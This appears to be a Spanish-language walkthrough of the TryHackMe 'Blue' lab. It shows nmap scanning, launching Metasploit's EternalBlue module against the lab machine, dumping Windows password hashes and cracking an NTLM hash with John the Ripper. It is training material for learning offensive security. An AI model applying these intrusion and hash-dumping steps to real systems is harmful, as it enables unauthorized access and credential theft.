# Blue - TryHackMe

## Herramientas utilizadas
- Nmap
- Metasploit
- JohnTheRipper

---

## Reconocimiento
Comprobamos conectividad y sistema operativo
```bash
ping -c 1 10.10.203.246
```
<img width="561" alt="image" src="https://github.com/user-attachments/assets/0bf538ba-634a-40c3-a30e-71e8c1dc9c16" /><br>

Observamos que devuelve ttl=127, lo que nos indica que se trata de una máquina Windows.

---

## Escaneo de puertos
```bash
nmap -p- -sS -sC -sV --open --min-rate=5000 -n -vvv -Pn -oN escaneo.txt 10.10.203.246
```
<img width="565" alt="image" src="https://github.com/user-attachments/assets/1175221a-6c6c-4118-ad9d-af57d4b7efea" /><br>
<img width="560" alt="image" src="https://github.com/user-attachments/assets/7fa79281-b1e5-4559-86eb-032e5344b0ee" /><br>

Detección de vulnerabilidades en el puerto 445
```bash
nmap --script "vuln" -p445 10.10.203.246
```
<img width="563" alt="image" src="https://github.com/user-attachments/assets/1b793bb1-5e82-4854-9042-a8dbdfbe7466" /><br>

---

## Gain Access
Tras identificar la vulnerabilidad, accedemos a Metasploit:
```bash
msfconsole
```
<img width="565" alt="image" src="https://github.com/user-attachments/assets/43537042-21ff-4284-ad5c-021a8109786e" /><br>

Cargamos el exploit de EternalBlue:
```bash
use 0
```
<img width="562" alt="image" src="https://github.com/user-attachments/assets/2a14fb48-f9ec-4078-ba00-c6262f521f13" /><br>

Ajustamos los parámetros necesarios:
- RHOSTS: IP de la máquina víctima
- LHOST: IP de nuestra máquina atacante

<img width="564" alt="image" src="https://github.com/user-attachments/assets/1e92f036-24cf-4e83-88d5-45ee95ca8e1f" /><br>

Ejecutamos el exploit:
```bash
run
```
Accedemos satisfactoriamente a la máquina.

<img width="563" alt="image" src="https://github.com/user-attachments/assets/d936ec3f-ca76-4f53-a748-cbba47191b90" /><br>

---

## Escalate
Listamos los procesos:
```bash
ps
```
<img width="563" alt="image" src="https://github.com/user-attachments/assets/337b16ca-6c85-4414-91db-b7f58638c5cd" /><br>

TryHackMe nos pide el último proceso ejecutado como NT AUTHORITY\SYSTEM, en este ejemplo con el ID 2968.

---

## Cracking
Volcamos los hashes de los usuarios:
```bash
hashdump
```
<img width="562" alt="image" src="https://github.com/user-attachments/assets/f4405787-875b-4940-98d9-071317c49ea4" /><br>

Copiamos la contraseña hash de Jon y la guardamos en un archivo para crackearla con JohnTheRipper:
```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash
```
✅ --format=NT indica explícitamente que el hash es NTLM, el formato que Windows utiliza para almacenar contraseñas.
Si no se indica, John podría confundirlo con LM, MD2, etc.

<img width="560" alt="image" src="https://github.com/user-attachments/assets/01c64035-c436-4101-96a8-daadb26a47ad" /><br>

---

## Flags

Una vez encontradas las tres flags, podemos leerlas con:
```bash
type flag1.txt
```

